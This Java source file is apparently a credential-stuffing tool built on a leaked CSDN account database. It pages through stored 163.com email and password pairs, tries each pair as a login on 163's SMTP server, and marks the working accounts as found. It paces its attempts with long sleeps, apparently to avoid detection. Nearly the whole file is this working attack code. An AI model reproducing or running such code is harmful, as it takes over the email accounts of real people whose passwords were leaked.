package org.shil.testcsdnetc.detect;

import java.util.List;
import java.util.Properties;

import javax.mail.Session;
import javax.mail.Transport;

import org.shil.testcsdnetc.db.CsdnAccountDaoImpl;
import org.shil.testcsdnetc.entity.CsdnAccount;

public class Email163Detect {

	public static boolean test163mail(String email,String password){
		Properties props = new Properties();
		
		//开启debug调试  
//		props.setProperty("mail.debug","true");
		
		//发送服务器需要身份验证  
		props.setProperty("mail.smtp.auth","true");
		//设置邮件服务器主机名  
		props.setProperty("mail.host","smtp.163.com");
//		props.setProperty("mail.smtp.host","smtp.163.com");
		//发送邮件协议名称  
		props.setProperty("mail.transport.protocol","smtp");
		
//		props.put("mail.smtp.port", "25"); //google使用465或587端口
//		props.put("mail.smtp.starttls.enable","true"); //使用 STARTTLS安全连接:

		//设置环境信息  
		Session session = Session.getInstance(props);
		Transport transport;
		try {
			transport = session.getTransport();
			//连接邮件服务器
			transport.connect(email.substring(0,email.indexOf("@")), password);
			
			System.out.println(email +"Result is " + transport.isConnected());
			
			return transport.isConnected();
			
		} catch (Exception e) {
			if(e.getMessage().contains("535 Error: authentication failed")){
//				System.out.println("do nothing");	
			}else{
				e.printStackTrace();
			}
		}

		return false;
	}
	
	public static void testAll163Account(){
		long offset = 0;
		long pagesize = 34;
		List<CsdnAccount> cas = null;
		do{
			cas =CsdnAccountDaoImpl.listCsdnAccounts("163.com",offset,pagesize);
			offset += pagesize;
			for(CsdnAccount ca : cas){
				
				if(test163mail(ca.getEmail(),ca.getPassword())){
					CsdnAccountDaoImpl.updateCsdnAccountStatusById(ca.getId(),1);
					System.out.println("got it:" + ca);
				}else{
					CsdnAccountDaoImpl.updateCsdnAccountStatusById(ca.getId(),2);
				}
				
				try {
					Thread.sleep(34567);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
			
			System.out.println(offset +"/1737405");
			
			try {
				Thread.sleep(45678);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			 
		}while(!cas.isEmpty());
		
	}

	public static void main(String[] args) {
		testAll163Account();
	}

}
